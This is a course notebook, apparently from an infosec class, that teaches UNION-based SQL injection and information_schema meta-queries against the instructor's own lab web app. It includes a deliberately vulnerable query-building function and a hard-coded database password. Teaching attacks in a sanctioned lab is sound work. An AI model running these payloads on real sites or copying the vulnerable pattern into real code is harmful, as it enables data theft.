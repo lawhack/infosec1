{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# SQL Injection\n",
    "\n",
    "I set up a web application that is running at the URL http://abadd00d.us-west-2.elasticbeanstalk.com This web application contains my secrets. I won't tell you my secrets. Your goal in this notebook is to find my secrets.\n",
    "\n",
    "You should explore the web application a bit to see how it works. It's not very fancy, but understanding what it does will help with the rest of the notebook.\n",
    "\n",
    "Somewhere in the application's code, I put in something that looks like this:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def do_search(word):\n",
    "    # ...\n",
    "    # Code ommitted here for simplicity\n",
    "    # ...\n",
    "    word=request.forms.get('word')\n",
    "    query=\"SELECT * FROM bigrams WHERE word1='\"+word+\"'\"\n",
    "    mycursor = mydb.cursor()\n",
    "    mycursor.execute(query)\n",
    "    myresult=mycursor.fetchall()\n",
    "    return {'pattern':word,'data':myresult}\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This code is vulnerable to SQL injection. The user's input in the variable `word` is directly used to build the SQL query without being sanitized. The intended behavior is something like this:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "word=\"the\"\n",
    "print(\"SELECT * FROM bigrams WHERE word1='\"+word+\"'\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "However, we can add to this query to get more information. The `UNION` SQL keyword can be used to combine the results of two queries."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "word=\"the' UNION SELECT * FROM bigrams WHERE word2='him\"\n",
    "print(\"SELECT * FROM bigrams WHERE word1='\"+word+\"'\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Try putting the contents of `word` from that last cell into the web application bigrams search. You should see more results, because we've added a second SQL query to query more data from the database. We're not supposed to be able to modify the SQL query itself, but that's exactly what we're doing. This is SQL injection. We're giving input to the application that modifies the SQL query itself.\n",
    "\n",
    "Using `UNION` to combine two query results can be tricky. Try running this injection attack, for example."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "word=\"the' UNION SELECT * FROM trigrams WHERE word2='him\"\n",
    "print(\"SELECT * FROM bigrams WHERE word1='\"+word+\"'\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "You should see an error message like `The used SELECT statements have a different number of columns`. That's because the `bigrams` and `trigrams` tables don't have the same numer of columns. If we want to use UNION to combine the results of two queries, we have to make the number of columns match. We can easily do that by messing with the `SELECT` clause of the query. We can, for example, just request the same column over and over again."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "word=\"the' UNION SELECT word2,word2,word2 FROM trigrams WHERE word2='him\"\n",
    "print(\"SELECT * FROM bigrams WHERE word1='\"+word+\"'\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Getting more output from the application might be useful to an attacker in some other circumstance, but your goal is to find secrets. You need to learn what other data is in the database."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Meta-queries\n",
    "\n",
    "There are databases in MySQL that contain information about MySQL. This means we can write queries to answer questions about state of MySQL itself. For our SQL injection attack, we would like to know what data we might extract from the web application. We can inject meta-queries to learn about the database. We can then use what we learn to write further SQL injections.\n",
    "\n",
    "Let's connect to the 'employees' example from last week to see some relevant examples of meta-queries. First, we might like to know what database we're connected to. This is obviously the 'employees' database, but it's only obvious to us because we're looking at the source code. We won't have the source code when we're performing SQL injection!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import mysql.connector\n",
    "\n",
    "database=mysql.connector.connect(user='webapp',\n",
    "                                 passwd='Bkypqyxa',\n",
    "                                 database='employees')\n",
    "cursor=database.cursor()\n",
    "\n",
    "query='''\n",
    "SELECT DATABASE();\n",
    "'''\n",
    "\n",
    "cursor.execute(query)\n",
    "result=cursor.fetchall()\n",
    "for x in result:\n",
    "  print(x)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We also might like to know what tables are available in the database. This query will tell us that."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import mysql.connector\n",
    "\n",
    "database=mysql.connector.connect(user='webapp',\n",
    "                                 passwd='Bkypqyxa',\n",
    "                                 database='employees')\n",
    "cursor=database.cursor()\n",
    "\n",
    "query='''\n",
    "SELECT table_name\n",
    "FROM information_schema.tables\n",
    "WHERE table_schema='employees';\n",
    "'''\n",
    "\n",
    "cursor.execute(query)\n",
    "result=cursor.fetchall()\n",
    "for x in result:\n",
    "  print(x)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Once we find a table we're interested in, for example maybe the `titles` table, we'd like to know what columns there are in that table. We can find that with a meta-query like this:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import mysql.connector\n",
    "\n",
    "database=mysql.connector.connect(user='webapp',\n",
    "                                 passwd='Bkypqyxa',\n",
    "                                 database='employees')\n",
    "cursor=database.cursor()\n",
    "\n",
    "query='''\n",
    "SELECT COLUMN_NAME\n",
    "  FROM INFORMATION_SCHEMA.COLUMNS\n",
    "  WHERE TABLE_SCHEMA = 'employees' AND TABLE_NAME = 'titles';\n",
    "'''\n",
    "cursor.execute(query)\n",
    "result=cursor.fetchall()\n",
    "for x in result:\n",
    "  print(x)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "These two meta-queries should be enough to help you find other tables to query with SQL injection."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Exercises\n",
    "\n",
    "Use SQL injection to find all my secrets. Tell me what they are. You've gotta."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
